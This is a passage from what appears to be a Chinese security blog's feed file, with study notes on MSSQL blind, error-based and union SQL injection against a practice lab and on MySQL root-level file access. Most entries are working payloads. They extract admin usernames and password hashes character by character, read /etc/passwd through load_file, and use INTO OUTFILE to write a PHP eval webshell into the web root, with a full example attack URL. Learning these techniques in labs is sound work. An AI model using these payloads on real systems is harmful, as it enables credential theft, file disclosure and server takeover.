class="keyword">name</span> <span class="keyword">from</span> mozhe_db_v2.dbo.sysobjects <span class="keyword">where</span> <span class="keyword">unicode</span>(<span class="keyword">substring</span>(<span class="keyword">name</span>,<span class="number">1</span>,<span class="number">1</span>))=<span class="number">109</span>)</span><br><span class="line"><span class="keyword">and</span> <span class="keyword">exists</span>(<span class="keyword">select</span> top <span class="number">1</span> <span class="keyword">name</span> <span class="keyword">from</span> mozhe_db_v2.dbo.sysobjects <span class="keyword">where</span> <span class="keyword">unicode</span>(<span class="keyword">substring</span>(<span class="keyword">name</span>,<span class="number">1</span>,<span class="number">1</span>))=<span class="number">109</span> <span class="keyword">and</span> <span class="keyword">name</span> <span class="keyword">not</span> <span class="keyword">in</span> (<span class="string">'manage'</span>))</span><br></pre></td></tr></table></figure><h3 id="猜解列名"><a href="#猜解列名" class="headerlink" title="猜解列名"></a>猜解列名</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and exists(<span class="keyword">select</span> top <span class="number">1</span> <span class="keyword">name</span> <span class="keyword">from</span> syscolumns <span class="keyword">where</span> <span class="keyword">id</span> =(<span class="keyword">select</span> <span class="keyword">id</span> <span class="keyword">from</span> sysobjects <span class="keyword">where</span> <span class="keyword">name</span> = <span class="string">'manage'</span>) <span class="keyword">and</span> <span class="keyword">unicode</span>(<span class="keyword">substring</span>(<span class="keyword">name</span>,<span class="number">1</span>,<span class="number">1</span>))=<span class="number">117</span>)</span><br></pre></td></tr></table></figure><h3 id="逐字猜解数据"><a href="#逐字猜解数据" class="headerlink" title="逐字猜解数据"></a>逐字猜解数据</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">and exists(<span class="keyword">select</span> <span class="keyword">id</span> <span class="keyword">from</span> manage <span class="keyword">where</span> <span class="keyword">unicode</span>(<span class="keyword">substring</span>(username,<span class="number">1</span>,<span class="number">1</span>))=<span class="number">97</span> <span class="keyword">and</span> <span class="keyword">ID</span>=<span class="number">1</span>)</span><br><span class="line"><span class="keyword">and</span> <span class="keyword">exists</span>(<span class="keyword">select</span> <span class="keyword">id</span> <span class="keyword">from</span> manage <span class="keyword">where</span> <span class="keyword">unicode</span>(<span class="keyword">substring</span>(username,<span class="number">2</span>,<span class="number">1</span>))=<span class="number">100</span> <span class="keyword">and</span> <span class="keyword">ID</span>=<span class="number">1</span>)</span><br><span class="line"><span class="keyword">and</span> <span class="keyword">exists</span>(<span class="keyword">select</span> <span class="keyword">id</span> <span class="keyword">from</span> manage <span class="keyword">where</span> <span class="keyword">unicode</span>(<span class="keyword">substring</span>(username,<span class="number">3</span>,<span class="number">1</span>))=<span class="number">109</span> <span class="keyword">and</span> <span class="keyword">ID</span>=<span class="number">1</span>)</span><br><span class="line">...</span><br><span class="line"><span class="keyword">and</span> <span class="keyword">exists</span>(<span class="keyword">select</span> <span class="keyword">id</span> <span class="keyword">from</span> manage <span class="keyword">where</span> <span class="keyword">unicode</span>(<span class="keyword">substring</span>(username,<span class="number">8</span>,<span class="number">1</span>))=<span class="number">122</span> <span class="keyword">and</span> <span class="keyword">ID</span>=<span class="number">1</span>)</span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">and exists(<span class="keyword">select</span> <span class="keyword">id</span> <span class="keyword">from</span> manage <span class="keyword">where</span> <span class="keyword">unicode</span>(<span class="keyword">substring</span>(<span class="keyword">password</span>,<span class="number">1</span>,<span class="number">1</span>))=<span class="number">55</span> <span class="keyword">and</span> <span class="keyword">ID</span>=<span class="number">1</span>)</span><br><span class="line"><span class="keyword">and</span> <span class="keyword">exists</span>(<span class="keyword">select</span> <span class="keyword">id</span> <span class="keyword">from</span> manage <span class="keyword">where</span> <span class="keyword">unicode</span>(<span class="keyword">substring</span>(<span class="keyword">password</span>,<span class="number">2</span>,<span class="number">1</span>))=<span class="number">50</span> <span class="keyword">and</span> <span class="keyword">ID</span>=<span class="number">1</span>)</span><br><span class="line"><span class="keyword">and</span> <span class="keyword">exists</span>(<span class="keyword">select</span> <span class="keyword">id</span> <span class="keyword">from</span> manage <span class="keyword">where</span> <span class="keyword">unicode</span>(<span class="keyword">substring</span>(<span class="keyword">password</span>,<span class="number">3</span>,<span class="number">1</span>))=<span class="number">101</span> <span class="keyword">and</span> <span class="keyword">ID</span>=<span class="number">1</span>)</span><br><span class="line"><span class="keyword">and</span> <span class="keyword">exists</span>(<span class="keyword">select</span> <span class="keyword">id</span> <span class="keyword">from</span> manage <span class="keyword">where</span> <span class="keyword">unicode</span>(<span class="keyword">substring</span>(<span class="keyword">password</span>,<span class="number">4</span>,<span class="number">1</span>))=<span class="number">49</span> <span class="keyword">and</span> <span class="keyword">ID</span>=<span class="number">1</span>)</span><br><span class="line">...</span><br><span class="line"><span class="keyword">and</span> <span class="keyword">exists</span>(<span class="keyword">select</span> <span class="keyword">id</span> <span class="keyword">from</span> manage <span class="keyword">where</span> <span class="keyword">unicode</span>(<span class="keyword">substring</span>(<span class="keyword">password</span>,<span class="number">16</span>,<span class="number">1</span>))=<span class="number">51</span> <span class="keyword">and</span> <span class="keyword">ID</span>=<span class="number">1</span>)</span><br></pre></td></tr></table></figure><p>最后得到的username值是:admin_mz；<br>最后得到的password值是:72e1bfc3f01b7583 解密:97285101</p>]]></content>
      
      
      <categories>
          
          <category> Web安全 </category>
          
          <category> SQL注入 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web安全 </tag>
            
            <tag> SQL注入 </tag>
            
            <tag> MSSQL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MS SQL Server 报错注入笔记</title>
      <link href="/2020/04/30/MS-SQL-Errorbased-Notes/"/>
      <url>/2020/04/30/MS-SQL-Errorbased-Notes/</url>
      
        <content type="html"><![CDATA[<h2 id="注入原理"><a href="#注入原理" class="headerlink" title="注入原理"></a>注入原理</h2><p>对于<code>convert(int,@@version)</code>，<code>convert</code>函数首先会执行第二个参数指定的SQL查询，然后尝试将查询结果转换 为int类型。但是，由于这个SQL查询的结果是varchar类型，无法进行指定的转换，所以，<code>convert</code>函数会抛出 一个SQL server错误消息，指出“SQL查询结果”无法转换为“int”类型，这样的话，攻击者就能得到的这个SQL查 询的结果了。</p><a id="more"></a><p>满足条件的函数还有很多:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">convert()</span><br><span class="line">file_name()</span><br><span class="line">db_name()</span><br><span class="line">col_name()</span><br><span class="line">filegroup_name()</span><br><span class="line">object_name()</span><br><span class="line">schema_name()</span><br><span class="line">type_name()</span><br><span class="line">cast()</span><br></pre></td></tr></table></figure><h2 id="convert-函数"><a href="#convert-函数" class="headerlink" title="convert()函数"></a>convert()函数</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CONVERT(data_type(length),data_to_be_converted,style)</span><br></pre></td></tr></table></figure><p><code>data_type(length)</code> 规定目标数据类型(带有可选的长度)。<code>data_to_be_converted</code> 含有需要转换的值。 <code>style</code> 规定日期/时间的输出格式。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">CONVERT(VARCHAR(19),GETDATE())</span><br><span class="line">CONVERT(VARCHAR(10),GETDATE(),110)</span><br><span class="line">CONVERT(VARCHAR(11),GETDATE(),106)</span><br><span class="line">CONVERT(VARCHAR(24),GETDATE(),113)</span><br></pre></td></tr></table></figure><h2 id="注入流程"><a href="#注入流程" class="headerlink" title="注入流程"></a>注入流程</h2><h3 id="查询基本信息"><a href="#查询基本信息" class="headerlink" title="查询基本信息"></a>查询基本信息</h3><p><code>convert()</code>函数直接加在查询的<code>?id=</code>语句后。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">convert(int,@@version) - 获取版本信息</span><br><span class="line">convert(int,db_name()) - 数据库名字</span><br><span class="line">convert(int,user) -当前用户名</span><br><span class="line">convert(int,@@SERVERNAME) – 获取有关服务器主机的信息</span><br></pre></td></tr></table></figure><h3 id="获取当前数据库的表名"><a href="#获取当前数据库的表名" class="headerlink" title="获取当前数据库的表名"></a>获取当前数据库的表名</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CONVERT(int,(<span class="keyword">select</span> top <span class="number">1</span> table_name <span class="keyword">from</span> information_schema.columns))</span><br></pre></td></tr></table></figure><h3 id="获取列名"><a href="#获取列名" class="headerlink" title="获取列名"></a>获取列名</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">convert(int,(<span class="keyword">select</span> top <span class="number">1</span> COLUMN_NAME <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> TABLE_NAME=<span class="keyword">cast</span>(<span class="number">16</span>进制的表名 <span class="keyword">as</span> <span class="built_in">varchar</span>)))</span><br></pre></td></tr></table></figure><h3 id="获取数据"><a href="#获取数据" class="headerlink" title="获取数据"></a>获取数据</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">convert(int,(<span class="keyword">select</span> top <span class="number">1</span> <span class="keyword">name</span> 列名 <span class="keyword">from</span> 表名))</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Web安全 </category>
          
          <category> SQL注入 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web安全 </tag>
            
            <tag> SQL注入 </tag>
            
            <tag> MSSQL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MS SQL Sever 联合查询注入笔记</title>
      <link href="/2020/04/30/MS-SQL-UNION-INJ-Notes/"/>
      <url>/2020/04/30/MS-SQL-UNION-INJ-Notes/</url>
      
        <content type="html"><![CDATA[<h2 id="判断是否为MSSQL"><a href="#判断是否为MSSQL" class="headerlink" title="判断是否为MSSQL"></a>判断是否为MSSQL</h2><p><code>and exists(select * from sysobjects) --</code></p><a id="more"></a><h3 id="权限介绍"><a href="#权限介绍" class="headerlink" title="权限介绍"></a>权限介绍</h3><ul><li>sa权限:数据库操作，文件管理，命令执行，注册表读取等</li><li>system db权限:文件管理,数据库操作等</li><li>users-adminstrators public权限:数据库操作 guest-users</li></ul><h3 id="判断权限的语句"><a href="#判断权限的语句" class="headerlink" title="判断权限的语句"></a>判断权限的语句</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">and 1=(<span class="keyword">select</span> is_srvrolemember(<span class="string">'sysadmin'</span>)) //判断是否是系统管理员</span><br><span class="line"><span class="keyword">and</span> <span class="number">1</span>=(<span class="keyword">select</span> is_srvrolemember(<span class="string">'db_owner'</span>)) //判断是否是库权限</span><br><span class="line"><span class="keyword">and</span> <span class="number">1</span>=(<span class="keyword">select</span> is_srvrolemember(<span class="string">'public'</span>)) //判断是否为<span class="keyword">public</span>权限</span><br></pre></td></tr></table></figure><h3 id="调用数据库的代码"><a href="#调用数据库的代码" class="headerlink" title="调用数据库的代码"></a>调用数据库的代码</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;%</span><br><span class="line">set conn =server.createobject(<span class="string">"adodb.connection"</span>)</span><br><span class="line">conn.open <span class="string">"provider=sqloledb;source=local;uid=sa;pwd=******;database=database-name"</span></span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><h2 id="注入流程"><a href="#注入流程" class="headerlink" title="注入流程"></a>注入流程</h2><h3 id="判断注入"><a href="#判断注入" class="headerlink" title="判断注入"></a>判断注入</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">'</span><br><span class="line">and 1=1 and 1=2</span><br></pre></td></tr></table></figure><h3 id="字段长度"><a href="#字段长度" class="headerlink" title="字段长度"></a>字段长度</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">order by</span><br></pre></td></tr></table></figure><h3 id="寻找字符型显位"><a href="#寻找字符型显位" class="headerlink" title="寻找字符型显位"></a>寻找字符型显位</h3><p><code>id=-2</code>是页面报错获得显位；有的系统只支持<code>union all select</code></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">id=-2 union all <span class="keyword">select</span> <span class="literal">null</span>,<span class="literal">null</span>,<span class="literal">null</span>,null.. //不一定是数字型显位</span><br><span class="line"><span class="keyword">id</span>=<span class="number">-2</span> <span class="keyword">union</span> <span class="keyword">all</span> <span class="keyword">select</span> <span class="string">'1'</span>,<span class="literal">null</span>,<span class="literal">null</span>,null.. //寻找显位</span><br></pre></td></tr></table></figure><h3 id="查询基本信息"><a href="#查询基本信息" class="headerlink" title="查询基本信息"></a>查询基本信息</h3><ol><li><code>@@version</code> - 获取版本信息;</li><li><code>db_name()</code> - 数据库名字</li><li><code>user,system_user,current_user,user_name</code> – 获取当前用户名</li><li><code>@@SERVERNAME</code> – 获取有关服务器主机的信息。</li></ol><h3 id="查询表名"><a href="#查询表名" class="headerlink" title="查询表名"></a>查询表名</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">/new_list.asp?id=-2 union all <span class="keyword">select</span> <span class="number">1</span>,(<span class="keyword">select</span> top <span class="number">1</span> <span class="keyword">name</span> <span class="keyword">from</span> mozhe_db_v2.dbo.sysobjects <span class="keyword">where</span> xtype=<span class="string">'u'</span>),<span class="string">'3'</span>,<span class="number">4</span></span><br><span class="line"></span><br><span class="line">/new_list.asp?<span class="keyword">id</span>=<span class="number">-2</span> <span class="keyword">union</span> <span class="keyword">all</span> <span class="keyword">select</span> <span class="number">1</span>,(<span class="keyword">select</span> top <span class="number">1</span> <span class="keyword">name</span> <span class="keyword">from</span> mozhe_db_v2.dbo.sysobjects <span class="keyword">where</span> xtype=<span class="string">'u'</span> <span class="keyword">and</span> <span class="keyword">name</span> <span class="keyword">not</span> <span class="keyword">in</span> (<span class="string">'manage'</span>)),<span class="string">'3'</span>,<span class="number">4</span></span><br><span class="line"></span><br><span class="line">/new_list.asp?<span class="keyword">id</span>=<span class="number">-2</span> <span class="keyword">union</span> <span class="keyword">all</span> <span class="keyword">select</span> <span class="number">1</span>,(<span class="keyword">select</span> top <span class="number">1</span> <span class="keyword">name</span> <span class="keyword">from</span> mozhe_db_v2.dbo.sysobjects <span class="keyword">where</span> xtype=<span class="string">'u'</span> <span class="keyword">and</span> <span class="keyword">name</span> <span class="keyword">not</span> <span class="keyword">in</span> (<span class="string">'manage'</span>,<span class="string">'announcement'</span>)),<span class="string">'3'</span>,<span class="number">4</span></span><br></pre></td></tr></table></figure><h3 id="获取列名"><a href="#获取列名" class="headerlink" title="获取列名"></a>获取列名</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">/new_list.asp?id=-2 union all <span class="keyword">select</span> <span class="literal">null</span>,(<span class="keyword">select</span> top <span class="number">1</span> col_name(object_id(<span class="string">'manage'</span>),<span class="number">1</span>) <span class="keyword">from</span> sysobjects),<span class="literal">null</span>,<span class="literal">null</span></span><br><span class="line"></span><br><span class="line">/new_list.asp?<span class="keyword">id</span>=<span class="number">-2</span> <span class="keyword">union</span> <span class="keyword">all</span> <span class="keyword">select</span> <span class="literal">null</span>,(<span class="keyword">select</span> top <span class="number">1</span> col_name(object_id(<span class="string">'manage'</span>),<span class="number">2</span>) <span class="keyword">from</span> sysobjects),<span class="literal">null</span>,<span class="literal">null</span></span><br><span class="line"></span><br><span class="line">/new_list.asp?<span class="keyword">id</span>=<span class="number">-2</span> <span class="keyword">union</span> <span class="keyword">all</span> <span class="keyword">select</span> <span class="literal">null</span>,(<span class="keyword">select</span> top <span class="number">1</span> col_name(object_id(<span class="string">'manage'</span>),<span class="number">3</span>) <span class="keyword">from</span> sysobjects),<span class="literal">null</span>,<span class="literal">null</span></span><br><span class="line"></span><br><span class="line">/new_list.asp?<span class="keyword">id</span>=<span class="number">-2</span> <span class="keyword">union</span> <span class="keyword">all</span> <span class="keyword">select</span> <span class="literal">null</span>,(<span class="keyword">select</span> top <span class="number">1</span> col_name(object_id(<span class="string">'manage'</span>),<span class="number">4</span>) <span class="keyword">from</span> sysobjects),<span class="literal">null</span>,<span class="literal">null</span></span><br></pre></td></tr></table></figure><h3 id="获取数据"><a href="#获取数据" class="headerlink" title="获取数据"></a>获取数据</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">new_list.asp?id=-2 union all <span class="keyword">select</span> <span class="literal">null</span>,username, <span class="keyword">password</span> ,<span class="literal">null</span> <span class="keyword">from</span> manage</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Web安全 </category>
          
          <category> SQL注入 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web安全 </tag>
            
            <tag> SQL注入 </tag>
            
            <tag> MSSQL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MySQL注入Root权限处理学习笔记</title>
      <link href="/2020/04/30/MySQL-Root-Notes/"/>
      <url>/2020/04/30/MySQL-Root-Notes/</url>
      
        <content type="html"><![CDATA[<h2 id="Root权限条件"><a href="#Root权限条件" class="headerlink" title="Root权限条件"></a>Root权限条件</h2><p>如果当前连接的mysql用户为<strong>root</strong>权限，在具有读写权限的前提下，我们是可以通过写入一句话木马到网站目录来获取网站权限的，也就是webshell。</p><a id="more"></a><h3 id="正常需要的条件"><a href="#正常需要的条件" class="headerlink" title="正常需要的条件"></a>正常需要的条件</h3><ul><li>当前连接到数据库的用户是root权限；</li><li>网站物理条件（报错、phpinfo页面、猜、爆破）</li></ul><h3 id="版本区别"><a href="#版本区别" class="headerlink" title="版本区别"></a>版本区别</h3><h4 id="MySQL-5-5-53前"><a href="#MySQL-5-5-53前" class="headerlink" title="MySQL 5.5.53前"></a>MySQL 5.5.53前</h4><p>5.5.53之前的版本是 <code>secure_file_priv</code> 变量默认为空，所以默认情况下是可以直接通过SQL语句来导出文件的。</p><h4 id="MySQL高于5-5"><a href="#MySQL高于5-5" class="headerlink" title="MySQL高于5.5"></a>MySQL高于5.5</h4><p>高于5.5时，mysql新出了一个secure-file-priv字段 : secure-file-priv参数是用来限制<code>LOAD DATA</code>, <code>SELECT ... &gt; OUTFILE</code>, and <code>LOAD_FILE()</code>传到哪个指定目录的。</p><ul><li>当<code>secure_file_priv</code>的值为<code>null</code> ，表示限制mysqld 不允许导入|导出</li><li>当<code>secure_file_priv</code>的值为<code>/tmp/</code> ，表示限制mysqld 的导入|导出只能发生在<code>/tmp/</code>目录下</li><li>当<code>secure_file_priv</code>的值没有具体值时，即<code>&#39;&#39;</code>，表示不对mysqld 的导入|导出做限制</li></ul><h2 id="实际操作"><a href="#实际操作" class="headerlink" title="实际操作"></a>实际操作</h2><h3 id="MySQL读文件"><a href="#MySQL读文件" class="headerlink" title="MySQL读文件"></a>MySQL读文件</h3><p>mysql读文件是用的 <code>load_file()</code> 函数:</p><ul><li><code>select load_file(&#39;/etc/passwd&#39;);</code></li><li><code>select load_file(0x2F6574632F706173737764);</code> 路径转换为十六进制，以 <code>0x</code> 开头。</li></ul><h3 id="MySQL写文件"><a href="#MySQL写文件" class="headerlink" title="MySQL写文件"></a>MySQL写文件</h3><p><code>INTO OUTFILE</code>函数写文件时会在每一行的结束自动加上换行符</p><p><code>INTO DUMPFILE</code>函数在写文件会保持文件得到原生内容，这种方式对于二进制文件是最好的选择</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="string">'&lt;?php @eval($_POST[pass])?&gt;'</span> <span class="keyword">into</span> <span class="keyword">outfile</span> <span class="string">'/var/www/html/muma.php'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> <span class="string">'&lt;?php @eval($_POST[pass])?&gt;'</span> <span class="keyword">into</span> <span class="keyword">DUMPFILE</span> <span class="string">'/var/www/html/muma.php'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> tdb_goods <span class="keyword">where</span> goods_id=<span class="number">1</span> <span class="keyword">into</span> <span class="keyword">outfile</span> <span class="string">"/var/www/html/muma.php"</span> <span class="keyword">LINES</span> <span class="keyword">STARTING</span> <span class="keyword">BY</span> <span class="string">'&lt;?php @eval($_POST[pass])?&gt;'</span></span><br></pre></td></tr></table></figure><ul><li><code>LINES STARTING BY &#39;写入的内容&#39;</code><br>设置每行数据开头的字符，可以为单个或多个字符。默认情况下不使用任何字符。</li><li><code>LINES TERMINATED BY &#39;写入的内容&#39;</code><br>设置每行数据结尾的字符，可以为单个或多个字符。默认值是<code>&quot;\n&quot;</code>。</li></ul><h2 id="PHP的GPC"><a href="#PHP的GPC" class="headerlink" title="PHP的GPC"></a>PHP的GPC</h2><p>在PHP中<code>get_magic_quotes_gpc()</code>函数是内置的函数，这个函数的作用就是得到php.ini设置中<code>magic_quotes_gpc</code>选项的值。</p><p><code>magic_quotes_gpc</code>选项：</p><p>如果<code>magic_quotes_gpc=On</code>，PHP解析器就会自动为post、get、cookie过来的数据增加转义字符“\”，以确保这些数据不会引起程序，特别是数据库语句因为特殊字符（认为是php的字符）引起的污染而出现致命的错误 。插入后在数据库里显示的是转义前的原始数据，所以取出来不用转义</p><p>在<code>magic_quotes_gpc=On</code>的情况下，如果输入的数据有</p><ul><li>单引号（’）</li><li>双引号（”）</li><li>反斜线（\）</li><li>NUL（NULL 字符）</li></ul><p>等字符都会被加上反斜线。这些转义是必须的，如果这个选项为off，那么我们就必须调用addslashes这个函数来为字符串增加转义。</p><p>正是因为这个选项必须为On，但是又让用户进行配置的矛盾，在PHP6中删除了这个选项，一切的编程都需要在<code>magic_quotes_gpc=Off</code>下进行了。在这样的环境下如果不对用户的数据进行转义，后果不仅仅是程序错误而已了。同样的会引起数据库被注入攻击的危险。所以从现在开始大家都不要再依赖这个设置为On了，以免有一天你的服务器需要更新到PHP6而导致你的程序不能正常工作。</p><p>当<code>magic_quotes_gpc=On</code>的时候，函数<code>get_magic_quotes_gpc()</code>就会返回<code>1</code></p><p>当<code>magic_quotes_gpc=Off</code>的时候，函数<code>get_magic_quotes_gpc()</code>就会返回<code>0</code></p><p>因此可以看出这个<code>get_magic_quotes_gpc()</code>函数的作用就是得到环境变量<code>magic_quotes_gpc</code>的值。既然在PHP6中删除了<code>magic_quotes_gpc</code>这个选项，那么在PHP6中这个函数我想也已经不复存在了。</p><p>可以使用盲注绕过GPC。</p><h2 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h2><p><code>http://www.xxx.net/index.php?id=1 and 1=2 union select 1,2,3,4,&#39;&lt;?php eval($_POST[1])?&gt;&#39;,5 into outfile &#39;/var/www/html/1.php&#39; -- a</code></p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://www.cnblogs.com/Rain99-/p/12560736.html#%E7%BD%91%E7%AB%99%E7%BB%9D%E5%AF%B9%E8%B7%AF%E5%BE%84" target="_blank" rel="noopener">MySQL注入中的信息收集</a></p><p><a href="http://www.teagle.top/index.php/archives/152/" target="_blank" rel="noopener">关于MySQL注入读写文件的限制</a></p><p><a href="http://sh1yan.top/2018/05/26/mysql-writ-shell/" target="_blank" rel="noopener">基于mysql下的几种写shell方法</a></p><p><a href="http://www.teagle.top/index.php/archives/157/" target="_blank" rel="noopener">MySQL注入写shell</a></p>]]></content>
      
      
      <categories>
          
          <category> Web安全 </category>
          
          <category> SQL注入 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web安全 </tag>
            
            <tag> SQL注入 </tag>
            
            <tag> MySQL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MySQL注入学习笔记</title>
      <link href="/2020/04/28/MySQL-Injec-Notes/"/>
      <url>/2020/04/28/MySQL-Injec-Notes/</url>
      
        <content type="html"><![CDATA[<h2 id="MySQL注入分类"><a href="#MySQL注入分类" class="headerlink" title="MySQL注入分类"></a>MySQL注入分类</h2><p>Sql 注入攻击是通过将恶意的 Sql 查询或添加语句插入到应用的输入参数中，再在后台Sql 服务器上解析执行进行的攻 击，它目前黑客对数据库进行攻击的最常用手段之一。</p><ol><li>联合查询注入</li><li>报错注入</li><li>布尔型盲注</li><li>时间盲注</li></ol><a id="more"></a><h2 id="联合查询注入"><a href="#联合查询注入" class="headerlink" title="联合查询注入"></a>联合查询注入</h2><h3 id="基本流程"><a href="#基本流程" class="headerlink" title="基本流程"></a>基本流程</h3><ol><li><p>判断是否存在注入（数字型还是字符型）</p><ol><li><p>单引号法：</p> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">'</span></span><br></pre></td></tr></table></figure></li><li><p>逻辑法：</p> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">and 1=1</span><br><span class="line">and 1=2</span><br><span class="line">1<span class="string">' and '</span>1<span class="string">'='</span>1</span><br><span class="line">1<span class="string">' and '</span>1<span class="string">'='</span>2</span><br></pre></td></tr></table></figure></li><li><p>运算法</p> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">-1</span><br><span class="line">-0</span><br></pre></td></tr></table></figure></li></ol></li><li><p>猜解表名</p><p> 常见敏感表名</p> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">admin</span><br><span class="line">user</span><br><span class="line">admin_userinfo</span><br><span class="line">system</span><br><span class="line">vipuser</span><br><span class="line">a_admin</span><br><span class="line">xxx_admin ······</span><br></pre></td></tr></table></figure></li><li><p>猜解字段数</p> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">order by xx</span><br></pre></td></tr></table></figure></li><li><p>猜解字段名</p><p> 常见的敏感字段名</p> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">username</span><br><span class="line">password</span><br><span class="line">admin_usernmae</span><br><span class="line">admin_password</span><br><span class="line">....</span><br></pre></td></tr></table></figure></li><li><p>获取数据</p> <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3.</span>.. <span class="keyword">from</span> xx</span><br></pre></td></tr></table></figure></li></ol><h3 id="常用函数"><a href="#常用函数" class="headerlink" title="常用函数"></a>常用函数</h3><p>几个常用的函数：</p><ul><li><p><code>user()</code>返回当前数据库连接使用的用户；</p></li><li><p><code>database()</code>返回当前数据库连接使用的数据库；</p></li><li><p><code>version()</code>返回当前数据库的版本；</p></li><li><p><code>concat</code>或者<code>concat-ws</code>函数可以将这些函数进行组合使用并显示出来。<code>concat</code>函数中，将其中的参数直接连接起来产生新的字符串。而在<code>concat_ws</code>函数中，第一个参数是用于作为分隔符将后面各个参数的内容分隔开来再进行相应的连接产生新的字符串。</p>  <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">concat_ws(char(32,58,32),user(),database(),version())</span><br></pre></td></tr></table></figure><p>  其中<code>char()</code>函数为将里面的参数转化为相应的字符，其中32为空格，58为冒号(:)，通过这样的方式可以绕过一些简单的过滤机制。</p></li></ul><p>几个全局函数：</p><ul><li>@@datadir</li><li>@@hostname</li><li>@@VERSION</li><li>@@version_compile_os</li></ul><h3 id="DVWA-Low级"><a href="#DVWA-Low级" class="headerlink" title="DVWA-Low级"></a>DVWA-Low级</h3><p>源代码：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span 